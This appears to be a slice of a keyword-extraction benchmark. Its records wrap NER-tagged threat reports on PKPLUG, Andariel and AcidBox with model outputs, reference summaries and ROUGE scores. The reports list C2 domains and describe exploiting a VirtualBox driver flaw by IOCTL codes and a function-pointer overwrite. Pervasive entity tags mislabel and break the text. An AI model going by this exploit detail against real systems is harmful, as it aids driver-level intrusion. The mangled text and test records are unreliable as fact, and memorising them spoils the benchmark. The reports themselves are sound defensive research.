microsoftwarer[.]com through a shared [ORG] IPv4 with parent domain [ORG] bodologetee[.]com . Domain microsoftwarer[.]com was found after threat hunting based on facts provided in publication ( # [MONEY] 4 ) \u201c \u201d FHAPPI \u201d Campaign : FreeHosting APT PowerSploit Poison Ivy \u201d in relation to the [ORG] FHAPPI campaign . The [PERSON] FHAPPI campaign ( # [MONEY] 4 ) was documented as using [ORG] PowerShell and [ORG] PowerSploit code in order to infect victims with [ORG] Poison Ivy , but very similar code was also found around [LOC] PlugX malware , some of which had [CARDINAL] C2 communication with logitechwkgame[.]com . Domain logitechwkgame[.]com was documented by Unit 42 in publication ( # [MONEY] 3 ) \u201c [WORK_OF_ART] Attack [WORK_OF_ART] Delivers [WORK_OF_ART] 9002 Trojan Through Google Drive \u201d as the C2 for the [DATE] 9002 [NORP] Trojans analyzed . [PERSON] FHAPPI is also connected through another malware using C2 infrastructure that relates , through a shared [ORG] IPv4 address , to [ORG] microsoftdefence[.]com , which malware documented in [ORG] Arbor [ORG] Networks \u2019 publication ( # [MONEY] 2 ) \u201c Poison Ivy Activity Targeting Myanmar , [ORG] Asian [ORG] Countries \u201d also used for C2 communication . Other Poison Ivy samples also related to the campaigns documented by [ORG] Arbor [ORG] Networks used domain webserver.servehttp[.]com for [CARDINAL] C2 communication . Said samples also shared overlaps in runtime characteristics with other [ORG] Poison Ivy samples that have been analyzed and con\ufb01rmed as having [CARDINAL] C2 communications with certain domains that relate to both Blue Coat Labs \u2019 publication ( # [MONEY] 1 ) and [ORG] Unit [ORG] 42 \u2019s research into [PRODUCT] Farseer malware and their publication ( # [MONEY] 6 ) \u201c [WORK_OF_ART] Farseer : [WORK_OF_ART] Previously [WORK_OF_ART] Unknown [WORK_OF_ART] Malware [WORK_OF_ART] Family bolsters the [NORP] Chinese armoury \u201d . Domains include [ORG] yahoomesseges[.]com and [PERSON] outhmail[.]com , tcpdo[.]net , [ORG] queryurl[.]com and [ORG] cdncool[.]com respectively . The same registrant of yahoomesseges[.]com \u2013 mongolianews@yahoo[.]com \u2013 also registered [ORG] ppt.bodologetee[.]com mentioned slightly earlier . Some HenBox malware has used domain cdncool[.]com as well for its [CARDINAL] C2 communications , as documented in Unit 42 \u2019s publication ( # [MONEY] 5 ) \u201c [WORK_OF_ART] The [WORK_OF_ART] Chickens [WORK_OF_ART] Come [WORK_OF_ART] Home [WORK_OF_ART] to [WORK_OF_ART] Roost . \u201d Domain cdncool[.]com is thus connected not only to [ORG] HenBox and [PERSON] Farseer campaigns , but also , throughurl [ORG] Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking [ORG] AsiaPoison Ivy malware , to the campaigns documented by [PERSON] Blue [PERSON] Coat [PERSON] Labs and [ORG] Arbor [ORG] Networks . HenBox is also connected through a [ORDINAL] third - level domain update.queryurl[.]com to queryurl[.]com that has been used for [CARDINAL] C2 communications by some [PERSON] Farseer samples . Other overlaps , mainly in infrastructure also exist ( as seen in Figure [CARDINAL] 2 above ) but are dif\ufb01cult to describe in a blog like this , hence using [ORG] Maltego . Figure [CARDINAL] 3 , as mentioned earlier , is a simpli\ufb01ed diagram to highlight some core overlaps . PKPLUG \u2019s Adversary Playbook Unit 42 has previously described and published [PERSON] Adversary [PERSON] Playbooks you can view using our [ORG] Playbook [ORG] Viewer . To recap brie\ufb02y , [PERSON] Adversary [PERSON] Playbooks provide a [ORG] Threat [ORG] Intelligence package in STIX [CARDINAL] 2.0 that include all IoCs for known attacks by a given adversary . In addition , said packages also include structured information about attack campaigns and adversary behaviours \u2014 their TTPs ) \u2014 described using Mitre \u2019s [PERSON] ATT&CK framework . [ORG] The [ORG] Adversary [ORG] Playbook for PKPLUG can be viewed here , and the STIX [CARDINAL] 2.0 content behind that can be downloaded from here . The [PERSON] Playbook contains several [PERSON] Plays ( aka campaigns ; instances of [ORG] the [ORG] Attack [ORG] Lifecycle ) that map , for the most part , to published research previously mentioned in this blog . There exists [PERSON] Plays including speci\ufb01c details from publications by [PRODUCT] Blue [PRODUCT] Coat [PRODUCT] Labs , [ORG] Arbor [ORG] Networks , our publication on the [DATE] 9002 Trojan , and the [PERSON] FHAPPI campaign . HenBox has [CARDINAL] two Plays \u2014 one for the known attack compromising a [ORDINAL] third - party app store to deliver the malware and another containing all other HenBox data . A similar single campaign exists for [PERSON] Farseer containing all related data . Conclusion Establishing a clear picture and understanding about a threat group , or groups , is virtually impossible without total visibility into every one of their attack campaigns . Based on this , applying a handle or moniker to a set of related data \u2014 such as network infrastructure , malware behavior , actor TTPs relating to delivery , ex\ufb01ltration , etc . \u2014 helps us to better understand what it is we \u2019re investigating . Sharing this information \u2014 with a handle , in this case PKPLUG \u2014 especially in a structured , codi\ufb01ed manner a la Adversary Playbooks , should allow others to contribute their vantage points and enrich said data until the understanding of a threat group becomes lucid . Based on what we know and what we \u2019ve gleaned from others \u2019 publications , and through industry sharing , [ORG] PKPLUG is a threat group , or groups , operating for [DATE] at [DATE] least [DATE] the [DATE] last [DATE] six [DATE] years using several malware families \u2014 some more well - known : Poison Ivy , PlugX , and [PERSON] Zupdax ; some are less well - known : [DATE] 9002 , [ORG] HenBox , and [PERSON] Farseer . Unit 42 has been tracking the adversary for [DATE] three [DATE] years and based on public reporting believes with high con\ufb01dence that it has origins to [NORP] Chinese nation - state adversaries . PKPLUG targets various countries or provinces in and around the [LOC] Southeast [LOC] Asia region for multiple possible reasons as mentioned above , including some countries that are members of the [ORG] ASEAN organisation , some regions that are autonomous to [GPE] China , some countries and regions somewhat involved with [GPE] China \u2019s Belt and Road Initiative , and \ufb01nally , some countries that are embroiled in ownership claims over [LOC] the [LOC] South [LOC] China [LOC] Sea . The [ORG] Playbook [ORG] Viewer helps to highlight some of the more common TTPs used by [ORG] PKPLUG but , based on our visibility , spear - phishing emails to deliver payloads to their victims is very popular . Some email attachments contained exploits taking advantage of vulnerable [ORG] Microsoft Of\ufb01ceurl Chinese Cyber Espionage Group Attacking Asiaapplications , however this technique was less commonly used compared with social engineering to lure the victim into opening attachments . [ORG] DLL side - loading seems almost ubiquitous as a method to install or run their payloads , though perhaps more recently , [ORG] PowerShell and [ORG] PowerSploit is also being considered . Other TTPs are described in the STIX [CARDINAL] 2.0 package and presented in the [LOC] Viewer . The use of [ORG] Android malware shows intent to get at targets where perhaps traditional computers , operating systems and ways of communicating are different from previous targets . [ORG] Palo [ORG] Alto [ORG] Networks detects customers are protected by these threats through the following : Customers using [ORG] AutoFocus can view this activity by using the following tags : PKPlug All malware identi\ufb01ed are detected as malicious by [ORG] WildFire and [ORG] TrapsIndicators [ORG] of [ORG] Compromise [ORG] Indicators of compromise relating to PKPLUG can be found in [FAC] the [FAC] Adversary [FAC] Playbook through [ORG] the [ORG] Playbook [ORG] Viewer itself , or indirectly from the STIX [CARDINAL] 2.0 JSON \ufb01le powering it . Get updates from [ORG] Palo [ORG] Alto [ORG] Networks ! Sign up to receive the latest news , cyber threat intelligence and research from usBy submitting this form , you agree to our Terms of Use and acknowledge our Privacy Statement.url", "generated_text": "Port; Chinese Cyber Espionage Group Attacking Asia; victims; Southeast Asia; the group; PlugX malware; ZIP archive files; the malware; PlugX malware; the payload; HenBox; Farseer; a Windows backdoor; 9002 Trojan; Trojan; Poison Ivy; Zupdax; other regions; the region; The report; similarities; infrastructure; China; the region; state; the group; targets; the region; Asia; targets; Tibet; Xinjiang; Mongolia; the threat actor; malware; the group; ties; infrastructure; organizations.", "ref_text": "<START-1>The report details the activities of a suspected Chinese cyberespionage group that Palo Alto Networks has dubbed \"PKPLUG.\" The group has been active since at least 2013 targeting countries in Southeast Asia, including Myanmar, Taiwan, Vietnam, and Indonesia. PKPLUG uses a variety of custom and publicly available malware in its campaigns, including PlugX, Poison Ivy, Zupdax, 9002, HenBox, and Farseer. Attacks often involve spear-phishing emails containing weaponized Office documents or links that deliver malware payloads. A common tactic is DLL side-loading, where legitimate signed applications are abused to load malware. Researchers have tied the group's infrastructure and malware to previous reporting on APT campaigns dating back 6 years. While the exact motives are unclear, installing backdoor Trojans on victim systems suggests an interest in surveillance and data gathering. Based on targeting and links to infrastructure previously associated with Chinese state-sponsored groups, PKPLUG appears to have similar origins. The group likely has interest in countries involved in regional tensions over the South China Sea and Beijing's Belt and Road initiative. The report provides an overview of PKPLUG's timeline based on public reporting, details on its targeting, and a graphical mapping of the associated infrastructure and malware. It concludes by summarizing PKPLUG's tactics, techniques, and procedures, highlighting that spear-phishing and DLL side-loading are prevalent. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5282051282051282, "gpt3/lexical/rouge_rouge2": 0.1597938144329897, "gpt3/lexical/rouge_rougeL": 0.3025641025641026, "gpt3/lexical/rouge_rougeLsum": 0.3025641025641026, "gpt3_generated_text": ["The article discusses the activities of a Chinese cyber espionage group, known as PKPLUG, that has been targeting victims in Southeast Asia, particularly Myanmar, Taiwan, Vietnam, and Indonesia. The group has been using a mix of publicly available and custom malware, including PlugX, HenBox, Farseer, 9002 Trojan, Poison Ivy, and Zupdax, to install backdoor Trojan implants on victim systems. The group's ultimate objectives are not entirely clear, but it is believed that they are tracking victims and gathering information. The group has ties to Chinese nation-state adversaries, and their targeting aligns with China's Belt and Road Initiative, as well as tensions in regions such as Tibet and Xinjiang. The report provides details on the group's methods for malware delivery, social engineering tactics, and command and control infrastructure. The group's targets also include regions outside of Southeast Asia, such as Mongolia, Tibet, and Xinjiang. Overall, the article highlights the activities of a sophisticated Chinese cyber espionage group targeting organizations and individuals in the Asia region."]}, {"split_name": "test", "sample_id": "test_99", "prompt_text": "Extract the keywords: [ORG] Trend [ORG] MicroAbout [ORG] TrendLabs [ORG] Security [ORG] Intelligence BlogHomeCategoriesSearch : Home \u00bb Bad Sites \u00bb New Andariel Reconnaissance Tactics Hint At [ORG] Next [ORG] TargetsNew [ORG] Andariel [ORG] Reconnaissance [ORG] Tactics [ORG] Hint At Next TargetsPosted on : [DATE] July 16 , [DATE] 2018 at [TIME] 8:10 [TIME] am Posted in : Bad Sites Author : [PERSON] Joseph [PERSON] C [PERSON] Chen ( Fraud Researcher ) In cooperation with IssueMakersLab of [GPE] South [GPE] KoreaReconnaissance plays a vital role in criminal operations , and some groups go to great lengths to investigate their targets \u2019 systems . A recent example is [ORG] the [ORG] Andariel [ORG] Group , a known branch of the notorious [ORG] Lazarus [ORG] Group . [DATE] Last [DATE] month we tracked new scouting techniques coming from [ORG] Andariel , which were used mainly against [NORP] South [NORP] Korean targets . [ORG] Andariel has been quite active [DATE] these [DATE] past [DATE] few [DATE] months . According to [NORP] South [NORP] Korean security researchers IssueMakersLab , the group used an ActiveX zero - day exploit for watering hole attacks on [NORP] South [NORP] Korean websites [DATE] last [DATE] May \u2014 they called this \u201c Operation GoldenAxe \u201d . But more recently on [DATE] June [DATE] 21 , we noticed that [PERSON] Andariel injected their script into [CARDINAL] four other compromised [NORP] South [NORP] Korean websites for reconnaissance purposes . We found that the code of the new injected script is similar to the sample [ORG] Andariel previously used in May. However , the new script was trying to collect different ActiveX object information and targeted objects that it was n\u2019t attacking before . [PERSON] Convert webpages to pdf online with PDFmyURLFeatured Storiessystemd Vulnerability Leads to Denial of Service on LinuxqkG [PERSON] Filecoder : Self - Replicating , Document- Encrypting RansomwareMitigating CVE-2017 - 5689 , an [ORG] Intel [ORG] Management [ORG] Engine VulnerabilityA Closer Look at [GPE] North [GPE] Korea \u2019s [ORG] InternetFrom [ORG] Cybercrime [ORG] to [ORG] CyberpropagandaSecurity [ORG] Predictions for [CARDINAL] 2018Attackers are banking on network vulnerabilities and inherent weaknesses to facilitate massive malware attacks , In the earlier case , the group collected targeted ActiveX objects on users [WORK_OF_ART] \u2019 [WORK_OF_ART] Internet [WORK_OF_ART] Explorer browser before they used the zero - day exploit . This was possibly part of their reconnaissance strategy , to find the right targets for their exploit . Based on this , we believe it \u2019s likely that the new targeted ActiveX objects we found could be their next targets for a watering hole exploit attack . To help prevent any damage , we decided to publish our findings before the group deploys the attack . IoT hacks , and operational disruptions . The ever - shifting threats and increasingly expanding attack surface will challenge users and enterprises to catch up with their security . Read our security predictions for [CARDINAL] 2018.Business Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . [ORG] Recent [ORG] PostsBlackgear [ORG] Cyberespionage [ORG] Campaign [ORG] Resurfaces , [ORG] Abuses [ORG] Social [ORG] Media for [ORG] C&C [ORG] CommunicationNew [ORG] Andariel [ORG] Reconnaissance [ORG] Tactics [ORG] Hint At Next TargetsVPNFilter - affected Devices Still Riddled with [CARDINAL] 19 [EVENT] VulnerabilitiesJuly Patch [DATE] Tuesday : Large Adobe Security Update and [ORG] Patches for [CARDINAL] 18 Critical Microsoft VulnerabilitiesFigure 1 . Watering hole reconnaissance flowAnalysis of the [ORG] Andariel techniquesOn [DATE] June [DATE] 21 , we found that the website of a [NORP] Korean non - profit organization was compromised with an injected script that collected visitors \u2019 information . We also found the same script on [CARDINAL] three [ORG] SouthMalicious [ORG] Macro [ORG] Hijacks [ORG] Desktop [ORG] Shortcuts [ORG] to [ORG] Deliver [ORG] BackdoorConvert webpages to pdf online with PDFmyURLPopular PostsUsing Insights From DefPloreX - NG to [ORG] Thwart [ORG] Web [ORG] Defacement [ORG] AttacksNorth [ORG] American Malware Trends : Taking a Proactive Approach to Modern ThreatsVPNFilter - affected [ORG] Devices [ORG] Still [ORG] Riddled with [CARDINAL] 19 [ORG] VulnerabilitiesIdentifying [ORG] Top [ORG] Vulnerabilities in Networks : Old Vulnerabilities , [ORG] IoT [ORG] Botnets , Wireless Connection ExploitsCryptocurrency - Mining Bot Targets Devices With Running SSH Service via [ORG] Potential [ORG] Scam [ORG] SiteStay [ORG] UpdatedEmail [ORG] SubscriptionYour email hereSubscribeKorean local government labor union websites . This reconnaissance lasted until [DATE] 27 [DATE] June . We already notified the websites about the compromise . We believe that the injected script came from the [ORG] Andariel group since the code has similar obfuscation and structure to the sample we previously found from them . The script was used to collect information from visitors \u2019 browser : browser type , system language , [PERSON] Flash [PERSON] Player version , [PERSON] Silverlight version , and multiple ActiveX objects . The original script is from the PluginDetect Library , and it was also used by exploit kits to verify victims before an attack . The verification process included sending collected information to another compromised website that hosted their [ORG] PHP program and was designed to receive the information . Figure [CARDINAL] 2 . Compromised website injected with malicious script that collects informationOur colleagues from the IssueMakersLab team shared insights and information about the [ORG] Andariel group , including that they attacked ActiveX vulnerabilities as far back as [DATE] 2007 . The team monitoring [ORG] Andariel found that the cybercriminal group injected a malicious script on a [NORP] South [NORP] Korean think tank website for reconnaissance in [DATE] January [DATE] 2017 and then switched to inject an ActiveX zero - day exploit in mid - April . IssueMakersLab also listed the ActiveX objects that the [ORG] Andariel group attacked . During analysis , we noticed that the new injected script was trying to detect [CARDINAL] two additional ActiveX objects that were not on the previous list . [CARDINAL] One is \u201c DSDOWNCTRL.DSDownCtrlCtrl.1 \u201d , which is related to a [ORG] DRM ( [ORG] Digital [ORG] Rights [ORG] Management ) software from a [ORG] South [ORG] Korean [ORG] Document [ORG] Protection [ORG] Security vendor . Another is \u201c WSACTIVEBRIDGEAX.WSActiveBridgeAXCtrl.1 \u201d , which is related to a [GPE] South [GPE] Korea - based voice conversion software company . Many local governments and publicConvert webpages to pdf online with PDFmyURLinstitutions use these software . We made a table to compare the information that the script samples collected in the previous case and this more recent case . Collected Information from Old Script Sample ( May 2018)Collected Information from New Script Sample ( June 2018)ParameterMeaningParameterMeaningwrolvbtbvbdvfvsilvezac \u2013 Website name<?=$referer ? > valueOS [PERSON] versionHTTP Accept - LanguageBrowser [PERSON] InformationBrowser [PERSON] InformationBrowser InformationFlash VersionSilverlight [CARDINAL] VersionEasyPayPlugin ActiveXAvailabilityACUBEFILECTRL [LOC] ActiveXAvailability*\u2013wrolvbtbvbdvfvsilvez \u2013 mgWebsite name<?=$referer ? > valueOS [PERSON] versionHTTP Accept - LanguageBrowser [PERSON] InformationBrowser [PERSON] InformationBrowser InformationFlash VersionSilverlight VersionEasyPayPlugin ActiveXAvailability \u2013 MagicLoaderX ActiveXAvailabilityConvert webpages to pdf online with PDFmyURL \u2013 siduiw\u2013\u2013\u2013\u2013SIClientAccess [CARDINAL] ActiveXAvailabilityDUZONERPSSO ActiveXAvailabilityINIWALLET61 ActiveXAvailability\u2013\u2013\u2013\u2013\u2013venvsidu \u2013 addwabNVersionMan ActiveXAvailabilitySIClientAccess [CARDINAL] ActiveXAvailabilityDUZONERPSSO ActiveXAvailability \u2013 admctrl ActiveX AvailabilityDSDownCtril ActiveXAvailability**WSActiveBridgeAX ActiveXAvailability***Voice [ORG] Conversion [ORG] Software \u201c WSActiveBridge \u201d WebSocket Availability * * * * * detection of the previous ActiveX zero - day object * * detection of the ActiveX object related to [ORG] DRM software ( [CARDINAL] one of the new targets ) * * * detection of the ActiveX object related to voice conversion software ( [CARDINAL] one of the new targets ) * * * * detection of the [ORG] WebSocket related to voice conversion software ( [CARDINAL] one of the new targets)Table [CARDINAL] 1 . Comparison of the information collected by the previous and new scriptBesides the ActiveX objects , we noticed that the script added new code to connect websocket to localhost . The voice conversion software has websocket service listening on the local host so the injected script can detect the software by checking if they can establish a connection to ports [DATE] 45461 and [DATE] 45462 , which the software uses . In addition , the verification process in the older script is different from the ActiveX detection , which was only for the Internet Explorer browser . In the script found in [DATE] June , the websocket verification could also be performed on other browsers like [PERSON] Chrome and Firefox . This shows that the attackerConvert webpages to pdf online with PDFmyURLhas expanded his target base , and is interested in the software itself and not just their ActiveX objects . Based on this change , we can expect them to start using attack vectors other than ActiveX.Figure [CARDINAL] 3 . Script ( Deobfuscated ) for detecting the voice conversion software ActiveX object andlocal websocket availabilityFigure [CARDINAL] 4 . The voice conversion software ( [ORG] WSActiveBridge.exe ) is listening on port [DATE] 45461 and45462Reconnaissance is the stage where attackers collect information from potential targets to help them determine what tactics will work . These new developments from the [ORG] Andariel group give us an idea of their plans , although we can not make specific assumptions about their strategy . To stay [CARDINAL] one step ahead of threats like this , we recommend that people use layered security protection in their environments . [ORG] Trend [ORG] Micro endpoint solutions such as [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Suites and Worry - Free \u2122 [ORG] Business [ORG] Security can protect users and businesses from similar threats by detecting malicious files and spammed messages as well as blocking all related malicious URLs . [ORG] Trend [ORG] Micro [ORG] Deep [ORG] Discovery \u2122 has an email inspection layer that can protect enterprises by detecting malicious attachment and URLs . [ORG] Convert webpages to pdf online with [ORG] PDFmyURLTrend [ORG] Micro \u2122 OfficeScan \u2122 with XGen \u2122 endpoint security infuses high - fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schw eiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / [LOC] IrelandLatin [LOC] America [LOC] Region ( LAR ): Brasil , [LOC] M\u00e9xicoNorth [LOC] America [LOC] Region ( [ORG] NABU ): [GPE] United [GPE] States , CanadaPrivacy StatementLegal PoliciesCopyright \u00a9 [DATE] 2018 Trend Micro Incorporated . All rights reserved . [ORG] Convert webpages to pdf online with PDFmyURL", "generated_text": "the report; The report; Trend Micro; South Korea; new scouting techniques; the Andariel Group; June 21; the script; four other compromised South Korean websites; reconnaissance purposes; the new script; different ActiveX object information; targeted objects; older versions; CVE-2017-5689; the same script; the same code; control; servers; a new version; use; the same custom version; the malware; infrastructure.", "ref_text": "<START-1>The document analyzes new reconnaissance tactics by the Andariel group, a branch of the Lazarus cybercrime group, used to target entities in South Korea. Andariel has compromised South Korean websites by injecting scripts that collect information on visitors' browsers including plugins, software versions, and ActiveX objects. This recon is likely preparation for watering hole attacks exploiting vulnerabilities in collected targets. Analysis shows Andariel has expanded its targeting from just ActiveX objects to also detect local websockets, indicating they may be expanding beyond ActiveX exploits. Newly monitored ActiveX objects point to digital rights management and voice conversion software used by South Korean institutions. Andariel has previously conducted similar recon before deploying an ActiveX zero-day in 2017. Their obfuscation techniques and code similarities connect this new activity to the group. Researchers have notified affected websites and published indicators of compromise including script hashes, command and control URLs, and listener ports. Andariel's recon provides insight into their plans and likely next targets. Recommendations include using layered security solutions and machine learning to detect related malware and block associated URLs. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49677419354838714, "gpt3/lexical/rouge_rouge2": 0.16233766233766234, "gpt3/lexical/rouge_rougeL": 0.23870967741935484, "gpt3/lexical/rouge_rougeLsum": 0.23870967741935484, "gpt3_generated_text": ["The article discusses the recent reconnaissance tactics used by the Andariel Group, a branch of the Lazarus Group, in targeting South Korean websites. The group has been active in the past few months and has used an ActiveX zero-day exploit for watering hole attacks on South Korean websites. In June, the group injected their script into four other compromised South Korean websites for reconnaissance purposes. The new script collected different ActiveX object information and targeted objects that were not attacked before. The article also mentions the Andariel group's previous use of targeted ActiveX objects in their reconnaissance strategy. The article concludes by stating that the new targeted ActiveX objects could be their next targets for a watering hole exploit attack. The findings have been published to help prevent any damage."]}, {"split_name": "test", "sample_id": "test_100", "prompt_text": "Extract the keywords: 6/18/2020AcidBox : [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian OrganizationsAcidBox : [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted Russian Organizationsunit42.paloaltonetworks.com/acidbox-rare-malwareDominik Reichel , Esmid IdrizovicJune 17 , 2020Executive SummaryWhen the news broke in [DATE] 2014 about a new sophisticated threat actor dubbed [ORG] the [ORG] Turla [ORG] Group , which the [NORP] Estonian foreign intelligence service believes has [NORP] Russian origins and operates on behalf of the FSB , its kernelmode malware also became the [ORDINAL] first publicly- described case that abused a [ORDINAL] third - party device driver to disable [LAW] Driver [LAW] Signature [LAW] Enforcement ( [ORG] DSE ) . This security mechanism was introduced in [GPE] Windows [GPE] Vista to prevent unsigned drivers from loading into kernel space . [PERSON] Turla exploited the signed [ORG] VirtualBox driver , VBoxDrv.sys v1.6.2 , to deactivate [ORG] DSE and load its unsigned payload drivers afterward . There is some confusion about this exploit , however , as it \u2019s often generally referred to as CVE-2008 - 3431 . The exploit used by [PERSON] Turla actually abuses [CARDINAL] two vulnerabilities \u2014 of which , [CARDINAL] only [CARDINAL] one was ever fixed in the aforementioned [ORG] CVE . The other vulnerability was found by [GPE] Turla and is used in the [ORDINAL] first version of their exploit , along with CVE-2008 - 3431 . The [ORDINAL] second version of their exploit , presumably introduced in [DATE] 2014 of their kernelmode malware , only uses the unpatched vulnerability , which we discuss in greater detail later . In [DATE] February [DATE] 2019 , Unit 42 found that a yet - to - be - known threat actor \u2014 unbeknownst to the infosec community \u2014 discovered that the [ORDINAL] second unpatched vulnerability can not only exploit [ORG] VirtualBox VBoxDrv.sys driver v1.6.2 , but also all other versions up to v3.0.0 . Furthermore , our research shows that this unknown actor exploited [ORG] VirtualBox driver version 2.2.0 to target [CARDINAL] at [CARDINAL] least [CARDINAL] two different [NORP] Russian organizations in [DATE] 2017 , which we are revealing for the [ORDINAL] first time . We anticipate this was done because the driver version [CARDINAL] 2.2.0url [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizationswasn\u2019t known to be vulnerable and thus most likely is not on the radar of security companies being exploited . Since no other victims have been found , we believe this is a very rare malware used in targeted attacks only . The actors used a previously unknown malware family that we have dubbed [PERSON] AcidBox due to the [ORDINAL] first part being an anagram of the malware \u2019s driver device name and the [ORDINAL] second part taken from [ORG] VirtualBox . Because of the malware \u2019s complexity , rarity , and the fact that it \u2019s part of a bigger toolset , we believe it was used by an advanced threat actor for targeted attacks and it \u2019s likely that this malware is still being used [DATE] today if the attacker is still active . However , we anticipate that it was rewritten to a certain extent . Based on the information we have , we do n\u2019t believe this unknown threat actor is tied to [GPE] Turla , except for the used exploit . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected from this threat . Our threat prevention platform with [ORG] WildFire identifies this malware as malicious . AutoFocus customers can track malware activity by using the [ORG] AcidBox tag . We also created an [PERSON] Adversary [PERSON] Playbook for this attack , which can be found here . The Unknown Threat [DATE] ActorIn [DATE] February [DATE] 2019 , we discovered a sample of [PERSON] AcidBox ( SHA256 : [ORG] VirusTotal , which contained a string known to be used in [GPE] Turla \u2019s [ORG] VirtualBox exploit . A deeper analysis of the sample revealed it \u2019s the main worker module as part of a sophisticated malware that we could n\u2019t tie to any known threat actor . In collaborating with our colleagues at Dr. [PERSON] Web , we learned that this sample was used in a targeted attack on an unspecified entity in [GPE] Russia back in [DATE] 2017 . Thankfully , they shared [CARDINAL] three additional samples of the same malware family . [CARDINAL] Two of those usermode samples are modules that load the main worker from the Windows registry and [CARDINAL] one is the kernelmode payload driver embedded in the main worker sample . Moreover , we contacted [PERSON] Kaspersky since the company is headquartered in [GPE] Russia , which found [CARDINAL] only [CARDINAL] one additional sample in their databases that was also the usermode loader version . We also contacted ESET , which did n\u2019t find any victims infected with this malware , just like in our own case . For this reason , we conclude it \u2019s a very rare malware used in targeted attacks only . What all the samples have in common are the compilation timestamps of [DATE] May 9 , [DATE] 2017 . This date seems legitimate , as the sample found by [ORG] Kaspersky appeared in [DATE] June [DATE] 2017 in their databases . Therefore , we conclude that the campaign which involved this malware took place in [DATE] 2017 . We could n\u2019t find any newer samples and thus it \u2019s unknown if [PERSON] AcidBox is still in use or has been further developed . We compared the specific characteristics of the samples to all publicly - known malware , but could n\u2019t find any clear overlaps . There are some very loose similarities to [LOC] Remsec malware attributed to [ORG] ProjectSauron , like : url [FAC] Rare [FAC] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian OrganizationsDWORD size data marker values Export function names made of [CARDINAL] 2/3 words MS Visual C / C++ compiler used Various import API functions overlaps Use of vulnerable [ORDINAL] 3rd party driver to load own unsigned driver [ORG] Zlib compression used Sensitive data encrypted in the resource sectionHowever , based on these facts alone , it \u2019s not possible to attribute the samples to the [ORG] ProjectSauron threat actor . We think it \u2019s more likely this is a yet unknown threat actor . [ORG] The [ORG] VirtualBox [ORG] Exploit and [GPE] Turla \u2019s VersionsThe original vulnerability described in CVE-2008 - 3431 was found by [ORG] Core [ORG] Security in [DATE] 2008 and affected VBoxDrv.sys less or equal version 1.6.2 . It was fixed in version [CARDINAL] 1.6.4 and thus could n\u2019t be exploited anymore . Figure [CARDINAL] 1 . Vulnerable and patched [ORG] VirtualBox device dispatch handler routines on the left andright , respectivelyThe vulnerability is located in the dispatch device control routine called VBoxDrvNtDeviceControl . On versions prior to [CARDINAL] 1.6.4 , you can call the usermode [ORG] DeviceIoControl API function and send one of the following control codes together with a kernel address you want to overwrite as the input / output buffer : SUP_IOCTL_FAST_DO_RAW_RUN SUP_IOCTL_FAST_DO_HM_RUN SUP_IOCTL_FAST_DO_NOPThe kernel address is passed down to the control handler ( see Figure [CARDINAL] 1 left , line [CARDINAL] 28 ) without any check or validation and is filled with the return value of supdrvIOCtlFast ( see Figure [CARDINAL] 1 left , line [CARDINAL] 24 ) . This is where the vulnerability digging from [ORG] CoreSecurity stops and where [PERSON] Turla continues . In the original exploit , the return value from supdrvIOCtlFast isn\u2019turl [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizationscontrolled and thus it will be a random value written to your kernel address . [ORG] Turla \u2019s exploit controls the return value by overwriting the function pointer of supdrvIOCtlFast to redirect execution to a small shellcode , which returns the needed value . This was described in great detail in a couple of articles and the complete reverse - engineered exploit code is also available . The patched version [CARDINAL] 1.6.4 ( see Figure [CARDINAL] 1 right ) does n\u2019t use the [ORG] UserBuffer pointer anymore , which could be abused by passing a kernel address . Additionally , it checks if the rc variable is equal or [CARDINAL] bigger [CARDINAL] than [CARDINAL] zero \u2014 which is n\u2019t needed for the patch , but more like a sanity check . With this patch , the original vulnerability to overwrite a kernel address was fixed . The other vulnerability that lets you control the function pointer of supdrvIOCtlFast remained unpatched . Of course , that \u2019s because it was n\u2019t discovered by [ORG] Core [ORG] Security at the time , but [DATE] only [DATE] a [DATE] few [DATE] years [DATE] later by the [GPE] Turla threat actor . While [PERSON] Turla still uses the vulnerable [ORG] VirtualBox driver v.1.6.2 to date , it only makes use of the unpatched vulnerability . The reason why and how it uses it was described by [ORG] Lastline , and also the reverse - engineered exploit code is available in a project named [PERSON] Turla [PERSON] Driver [PERSON] Loader . The secret is the exact same exploit , with only a small modification \u2014 which we wo n\u2019t disclose here \u2014 can be used on all VBoxDrv.sys versions up to [CARDINAL] 3.0.0 . This was also figured out by an unknown threat actor . While [ORG] VirtualBox versions smaller than [CARDINAL] 4.0 are n\u2019t available on the official website anymore , they can still be found on some software download sites . Starting from version [CARDINAL] 3.0.0 , some structures and routines have changed so the exploit does not work anymore . However , it ca n\u2019t be ruled out that in later versions it \u2019s still possible to exploit the same vulnerability with some more adjustments . What \u2019s also interesting is that not even the [GPE] Turla authors themself seem to have realized that . They still use the old VBoxDrv.sys v.1.6.2 in their otherwise stealthy exploit . This driver is widely known to be used for malicious or various otherwise dubious purposes , for example , in - game cheats . Technical Analysis of AcidBoxThe malware is a complex modular toolkit of which we have only a part of it . In total , we have found [CARDINAL] four 64 - bit usermode DLLs and an unsigned kernelmode driver ( SHA256 : of the [CARDINAL] four usermode samples have identical functionality and are loaders for the main worker module . They only differ in their file descriptions and the embedded and encrypted registry path . These loaders are created as security support providers ( further SSP ) . A [ORG] SSP is a [ORG] DLL that exports at least the function SpLsaModeInitialize and usually provides security mechanisms such as authentication between client / server applications . There are a couple of standard SSPs provided in Windows 